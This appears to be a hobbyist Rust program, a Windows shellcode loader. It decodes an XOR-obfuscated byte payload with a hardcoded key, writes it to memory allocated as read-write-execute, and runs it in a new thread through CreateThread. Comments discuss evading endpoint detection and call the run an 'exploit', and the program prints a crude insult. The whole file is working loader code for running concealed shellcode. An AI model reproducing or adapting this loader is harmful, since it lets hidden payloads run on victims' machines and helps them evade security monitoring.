/*--------------------------------------------------
- Note: Here we've mapped the memory for our shellcode as executable, but apparently that's a NO NO,
  you're supposed to map it as read/write, and then set it as executable with a seperate command.
  However that command is leading to illegal memory accesses, which I've yet to diagnose and cbf atm.
  Mapping memory regions as r/w/x is a huge red flag for EDR.
--------------------------------------------------*/

// use std::ptr::{null, null_mut};
use std::{ffi::c_void, mem::transmute};
// use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{CreateThread, WaitForSingleObject, THREAD_CREATION_FLAGS};
use xor_obfuscator::{xor, Key};

fn main() {
    let encoded_payload: &[u8] = [
        145, 49, 228, 139, 159, 140, 171, 101, 121, 109, 56, 54, 46, 63, 54, 58, 51, 49, 92, 171,
        2, 39, 228, 54, 11, 45, 242, 63, 97, 47, 228, 61, 68, 35, 238, 11, 61, 49, 104, 216, 37,
        46, 38, 84, 176, 37, 72, 167, 195, 83, 5, 23, 103, 85, 77, 56, 166, 166, 98, 37, 106, 164,
        155, 128, 43, 38, 62, 39, 239, 57, 69, 242, 47, 69, 47, 110, 191, 239, 235, 237, 121, 109,
        121, 47, 234, 175, 16, 12, 45, 120, 189, 41, 236, 39, 119, 32, 224, 37, 89, 36, 120, 183,
        140, 57, 44, 148, 172, 56, 230, 77, 239, 39, 110, 178, 38, 84, 176, 37, 72, 167, 195, 46,
        165, 162, 104, 56, 108, 184, 95, 143, 26, 149, 39, 102, 53, 73, 113, 34, 86, 190, 17, 179,
        61, 61, 230, 57, 67, 38, 110, 180, 13, 36, 242, 97, 49, 35, 228, 47, 120, 34, 100, 169, 44,
        242, 99, 231, 39, 101, 187, 36, 33, 44, 33, 57, 54, 53, 37, 51, 36, 32, 44, 35, 47, 236,
        131, 68, 42, 55, 134, 141, 33, 38, 54, 53, 44, 224, 119, 144, 58, 134, 152, 144, 50, 44,
        209, 100, 121, 109, 121, 103, 111, 111, 100, 35, 232, 244, 108, 120, 103, 111, 46, 222, 90,
        238, 22, 234, 134, 178, 212, 159, 209, 201, 51, 56, 215, 223, 242, 210, 242, 155, 190, 45,
        250, 169, 81, 91, 105, 19, 110, 235, 158, 153, 24, 124, 220, 40, 124, 22, 4, 15, 121, 52,
        56, 238, 181, 144, 177, 8, 4, 21, 14, 87, 2, 23, 10, 100,
    ]
    .as_slice();

    // Make sure the key is the same as the one used to encrypt the payload.
    let mut payload = xor(encoded_payload, &Key::new("mygoodkey"));
    let payload_size = payload.len();

    let payload_addr: *mut c_void;
    unsafe {
        payload_addr = VirtualAlloc(
            None,
            payload_size,
            MEM_RESERVE | MEM_COMMIT,
            // normally you'd set the page as non-executable, and then make it executable after you've written the payload to it.
            PAGE_EXECUTE_READWRITE,
            // PAGE_READWRITE,
        );
        if payload_addr.is_null() {
            panic!("Failed to allocate memory for payload");
        }

        // no idea if this is the right way to memcpy...
        payload_addr.copy_from(payload.as_ptr() as *const c_void, payload_size);
    }

    // zero out the payload
    for byte in payload.iter_mut() {
        *byte = 0;
    }

    unsafe {
        // make our alloc'd memory region executable.
        // let mut old_flags: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
        // let res = VirtualProtect(
        //     payload_addr,
        //     payload_size,
        //     PAGE_EXECUTE_READ,
        //     transmute(&mut old_flags),
        // );
        // match res {
        //     Ok(_) => println!("Memory region is now executable"),
        //     Err(err) => panic!(
        //         "Failed to make memory region executable\n Err: {err:?}\nGetLastError: {:?}\n",
        //         GetLastError()
        //     ),
        // }
        // create thread in which our shellcode will run.
        let res = CreateThread(
            None,
            0 as usize,
            // no idea how this transmute function works, way too magical to rely on....
            Some(transmute(payload_addr)),
            None,
            // abit suss here.
            THREAD_CREATION_FLAGS(0),
            None,
        );
        let handle = match res {
            Ok(handle) => {
                println!("Thread created successfully");
                handle
            }
            Err(err) => panic!("Failed to create thread\n Err: {err:?}\n"),
        };
        println!("your mums a hoe");
        println!("waiting 5 seconds for the new thread start executing");

        // need to be careful, these options are finnicky and we don't want to do some suss shit.
        // since we are using MEM_RELESE and not MEM_DECOMMIT, we set the size param as 0. MEM_DECOMIT, would free
        // the physical pages without releasing the virtual address space we have access to, meaning we could re-use
        // the same space for later payloads... or something like that.

        // feel like this should happen after we wait for the thread, but no code after
        // WaitForSignelObject seems to run... so not quite sure. This is quite sure and shouldn't
        // be a method we use in production.
        let res = VirtualFree(payload_addr, 0, MEM_RELEASE);
        match res {
            Ok(_) => println!("succesfully free'd the memory, exploit complete!"),
            Err(err) => {
                panic!("failed to free the memory we alloc'd for our payload !!! :(\nErr: {err:?}")
            }
        }

        WaitForSingleObject(handle, 5000);
        println!("new thread has executed, now we will free the memory we alloc'd for our payload");
    }
}
